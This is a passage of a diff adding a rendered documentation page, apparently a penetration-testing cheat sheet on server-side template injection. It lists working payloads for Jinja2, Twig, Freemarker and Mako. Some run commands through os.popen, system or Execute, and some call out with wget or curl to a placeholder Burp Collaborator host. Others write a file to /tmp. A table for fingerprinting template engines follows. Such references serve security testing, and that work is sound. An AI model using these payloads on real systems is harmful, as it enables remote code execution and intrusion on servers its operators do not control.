+</span><span id="__span-41-4"><a id="__codelineno-41-4" name="__codelineno-41-4" href="#__codelineno-41-4"></a><span class="p">{{</span><span class="n">config</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;wget http://BURP_COLLAB&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+</span><span id="__span-41-5"><a id="__codelineno-41-5" name="__codelineno-41-5" href="#__codelineno-41-5"></a>
+</span><span id="__span-41-6"><a id="__codelineno-41-6" name="__codelineno-41-6" href="#__codelineno-41-6"></a><span class="c1"># Twig</span>
+</span><span id="__span-41-7"><a id="__codelineno-41-7" name="__codelineno-41-7" href="#__codelineno-41-7"></a><span class="p">{{[</span><span class="s1">&#39;curl http://BURP_COLLAB&#39;</span><span class="p">]</span><span class="o">|</span><span class="nb">filter</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)}}</span>
+</span><span id="__span-41-8"><a id="__codelineno-41-8" name="__codelineno-41-8" href="#__codelineno-41-8"></a>
+</span><span id="__span-41-9"><a id="__codelineno-41-9" name="__codelineno-41-9" href="#__codelineno-41-9"></a><span class="c1"># Freemarker</span>
+</span><span id="__span-41-10"><a id="__codelineno-41-10" name="__codelineno-41-10" href="#__codelineno-41-10"></a><span class="err">$</span><span class="p">{</span><span class="s2">&quot;freemarker.template.utility.Execute&quot;</span><span class="err">?</span><span class="n">new</span><span class="p">()(</span><span class="s2">&quot;curl http://BURP_COLLAB&quot;</span><span class="p">)}</span>
+</span></code></pre></div>
+<h3 id="file-creation">File Creation<a class="headerlink" href="#file-creation" title="Permanent link">&para;</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a><span class="c1"># Jinja2</span>
+</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a><span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">40</span><span class="p">](</span><span class="s1">&#39;/tmp/pwned&#39;</span><span class="p">,</span><span class="s1">&#39;w&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;test&#39;</span><span class="p">)}}</span>
+</span><span id="__span-42-3"><a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a>
+</span><span id="__span-42-4"><a id="__codelineno-42-4" name="__codelineno-42-4" href="#__codelineno-42-4"></a><span class="c1"># Mako</span>
+</span><span id="__span-42-5"><a id="__codelineno-42-5" name="__codelineno-42-5" href="#__codelineno-42-5"></a><span class="o">&lt;%</span> <span class="kn">import</span><span class="w"> </span><span class="nn">os</span><span class="p">;</span> <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;touch /tmp/pwned&#39;</span><span class="p">)</span> <span class="o">%&gt;</span>
+</span></code></pre></div>
+<hr />
+<h2 id="template-engine-fingerprinting">Template Engine Fingerprinting<a class="headerlink" href="#template-engine-fingerprinting" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th>Payload</th>
+<th>Jinja2</th>
+<th>Twig</th>
+<th>Freemarker</th>
+<th>Velocity</th>
+<th>ERB</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>{{7*7}}</code></td>
+<td>49</td>
+<td>49</td>
+<td>Error</td>
+<td>Error</td>
+<td>Error</td>
+</tr>
+<tr>
+<td><code>${7*7}</code></td>
+<td>${7*7}</td>
+<td>${7*7}</td>
+<td>49</td>
+<td>49</td>
+<td>${7*7}</td>
+</tr>
+<tr>
+<td><code>&lt;%= 7*7 %&gt;</code></td>
+<td>Error</td>
+<td>Error</td>
+<td>Error</td>
+<td>Error</td>
+<td>49</td>
+</tr>
+<tr>
+<td><code>{{7*'7'}}</code></td>
+<td>7777777</td>
+<td>49</td>
+<td>Error</td>
+<td>Error</td>
+<td>Error</td>
+</tr>
+<tr>
+<td><code>#{7*7}</code></td>
+<td>Error</td>
+<td>Error</td>
+<td>Error</td>
+<td>Error</td>
+<td>49</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<div class="admonition tip">
+<p class="admonition-title">Context Matters</p>
+<p>Identify the backend language first (Python/PHP/Java/Ruby), then narrow down the template engine.</p>
+</div>
+<hr />
+<p><em>See also: <a href="../xss/">XSS</a> for client-side injection, <a href="cmdi.md">Command Injection</a> for direct OS execution.</em></p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.tracking", "navigation.tabs", "navigation.sections", "navigation.indexes", "navigation.top", "navigation.prune", "search.suggest", "search.highlight", "search.share", "content.code.copy", "content.code.annotate", "content.tabs.link", "toc.follow"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": {"client-side": "client-side", "critical": "critical", "high": "high", "infra": "infra", "logic": "logic", "low": "low", "medium": "medium", "server-side": "server-side"}, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
